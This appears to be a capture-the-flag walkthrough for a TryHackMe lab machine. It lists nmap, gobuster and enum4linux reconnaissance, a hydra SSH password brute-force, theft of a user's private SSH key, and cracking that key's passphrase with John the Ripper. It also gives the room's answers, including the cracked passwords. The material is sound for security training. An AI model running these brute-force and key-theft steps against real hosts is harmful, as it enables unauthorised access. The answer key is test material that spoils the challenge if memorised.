# Basic Pentesting Wlakthrough
### Link
- https://tryhackme.com/room/basicpentestingjt
------------------------
### Namp
- Find the services exposed by the machine
    - sudo nmap -sV -sC -oN [Path]/[Result File name].txt [IP]
    - Findings:
        - Open port: 22 / 80 / 139 / 445 / 8009 / 8080
        - Service exposed : smb
    - picture: [Basic_Pentesting_1.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_1.png)
    - picture: [Basic_Pentesting_2.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_1.png)
### Gobuster
- Find directories
    - sudo gobuster dir -u [IP] -w [path]/directory-list-2.3-medium.txt
    - picture: [Basic_Pentesting_3.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_3.png)

- *What is the name of the hidden directory on the web server(enter name without /)?*
    - **Answer**: development
### Analyze development folder
- Connect to /devolpment
    - [IP]/development
        - 2 files available: **dev.txt** and **J.txt**
        - picture: [Basic_Pentesting_4.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_4.png)
    - Analyze these 2 files
        - **dev.txt**
        > I'm using version 2.5.12

        > SMB has been configured

        > I got Apache set up. Will put in our content later.
        - **J.txt**
        > /etc/shadow to make sure we don't have any weak credentials,

        > and I was able to crack your hash really easily
### Search user - enum4linux
- For this step, we can use **enum4linux**
    - sudo enum4linux -a [IP]
    - result: [Basic_Pentesting_5.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_5.png)
 - What is the username?
    - **Answer**: jan
- What is the name of the other user you found(all lower case)?
    - **Answer**: kay
### Brute force Jan account
- For this step, we can use hydra
    -  hydra -l jan -P [path]/rockyou.txt ssh://[IP]
    - result: [Basic_Pentesting_6.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_6.png)
- What is the password?
    - **Answer**: armando

### Gain access to the machine
- For this step, we use SSH
    - picture: [Basic_Pentesting_7.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_7.png)
- What service do you use to access the server(answer in abbreviation in all caps)?
    - **Answer**: SSH
- Check /etc/passwd
    - picture: [Basic_Pentesting_8.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_8.png)
- Move to kay directory
    - /home/kay
- Check all files, hidden files included
    - ls -la
    - picture: [Basic_Pentesting_9.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_9.png)
    - Check all folders available. **.ssh** is accessible. We have public and private key.
    - We can access the private key **id_rsa**
        - Copy the private key
        - Create file on your local machine and try to access the targeted machine through SSH with kay private key
            - ssh -i id_rsa kay@[IP]
        - Result: We need password/passphrase
        - picture: [Basic_Pentesting_10.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_10.png)
### Obtain  hte password
- Previously, under /home/kay, we found the public and private key. We also know, from **J.txt**, the password is really easy to crack.
- From the public **id_rsa.pub**, let's try to obtain the hash by using ssh2john.py
    - /usr/share/john/ssh2john.py ./id_rsa > jay_hash.txt
- Now, use johntheripper
    - john jay_hash.txt
        - Result: 
        > Cost 1 (KDF/cipher [0=**MD5**/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
- This result means the encryption used is **MD5** so we can try with johntheripper to obtain the password
    - john jay_hash.txt --wordlist=[path]/rockyou.txt
        - Result:
        > beeswax
- Try one more time to access the server
    - ssh -i id_rsa kay@[IP]
    - Use the password
    - picture: [Basic_Pentesting_11.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_11.png)
- Navigate. We found the file **pass.bak**
- What is the final password you obtain?
    - **Answer**: heresareallystrongpasswordthatfollowsthepasswordpolicy$$
    - picture: [Basic_Pentesting_12.png](https://github.com/LNB283/THM/blob/main/Basic%20Pentesting/Pictures/Basic_Pentesting_12.png)


